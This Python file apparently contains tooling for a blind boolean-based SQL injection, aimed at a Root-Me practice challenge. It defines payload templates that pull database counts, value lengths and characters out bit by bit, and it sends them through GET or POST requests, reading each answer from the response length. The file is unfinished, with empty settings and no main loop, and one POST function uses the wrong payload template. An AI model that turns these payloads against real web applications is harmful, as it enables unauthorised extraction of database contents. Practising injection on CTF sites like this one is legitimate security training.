import requests
from requests.utils import requote_uri
from enum import Enum

DATA_COUNT_SHIFT_QUERY = ' and (select substr(lpad(bin(count({0})>>{1}),8,0),8,1)=1)'
DATA_LENGTH_SHIFT_QUERY = ' and (select substr(lpad(bin(length({0})>>{1}),8,0),8,1)=1)'
DATA_BIT_SHIFT_QUERY = ' and (select substr(lpad(bin(ascii(substr({0},{1},1))>>{2}),8,0),8,1)=1 LIMIT {3}, 1)'
# Insert target url
TARGET_URL = 'http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=3'
# insert your table name
TABLE_NAME = ''

# Insert test data for post
# Must have PARAM_NAME
DATA_PARAMS = {}
# Insert test param name for post
# Param must in data.
PARAM_NAME = ''


class HTTPMethod(Enum):
    GET = "GET",
    POST = "POST"


def parsing_bin_list_to_decimal(bin_list):
    return int(''.join(bin_list), 2)


def parsing_bin_list_to_char(bin_list):
    return chr(parsing_bin_list_to_decimal(bin_list))


# Add get, post

def get_length_by_get_method(query, shift_idx):
    return len(requests.get(requote_uri(TARGET_URL + '\'' +
                                        DATA_LENGTH_SHIFT_QUERY.format(query,
                                                                       shift_idx))).text)


def get_length_by_post_method(query, shift_idx, data_params=DATA_PARAMS):
    data_params[PARAM_NAME] = data_params[PARAM_NAME] + '\'' + DATA_LENGTH_SHIFT_QUERY.format(query, shift_idx)
    return len(requests.post(url=requote_uri(TARGET_URL), data=data_params).text)


def get_count_by_get_method(query, shift_idx):
    return len(requests.get(requote_uri(TARGET_URL + '\'' +
                                        DATA_COUNT_SHIFT_QUERY.format(query, shift_idx))).text)


def get_count_by_post_method(query, shift_idx,data_params=DATA_PARAMS):
    data_params[PARAM_NAME] = data_params[PARAM_NAME] + '\'' + DATA_COUNT_SHIFT_QUERY.format(query, shift_idx)
    return len(requests.post(url=requote_uri(TARGET_URL), data=data_params).text)


def get_data_by_get_method(query, data_idx, shift_idx, tuple_idx):
    return len(requests.get(requote_uri(TARGET_URL + '\'' +
                                        DATA_BIT_SHIFT_QUERY.format(query, data_idx, shift_idx, tuple_idx))).text)


def get_data_by_post_method(query, data_idx, shift_idx, tuple_idx,data_params=DATA_PARAMS):
    data_params[PARAM_NAME] = data_params[PARAM_NAME] + '\'' + DATA_COUNT_SHIFT_QUERY.format(query,
                                                                                             data_idx,
                                                                                             shift_idx,
                                                                                             tuple_idx)
    return len(requests.post(url=requote_uri(TARGET_URL), data=data_params).text)
